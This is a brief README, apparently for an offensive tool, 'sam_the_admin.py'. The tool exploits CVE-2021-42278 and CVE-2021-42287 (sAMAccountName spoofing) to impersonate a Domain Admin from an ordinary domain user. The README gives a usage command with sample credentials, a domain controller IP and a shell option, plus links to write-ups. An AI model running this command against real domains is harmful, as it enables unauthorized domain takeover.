Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 

[![asciicast](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm.svg)](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm)

usage:

python3 sam_the_admin.py "domainname/John:Admin@123" -dc-ip 172.16.242.135 -shell

### Known issues
- it will not work outside kali , i will update it later on :)

#### Check out 
- [CVE-2021-42287/CVE-2021-42278 Weaponisation ](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [sAMAccountName spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
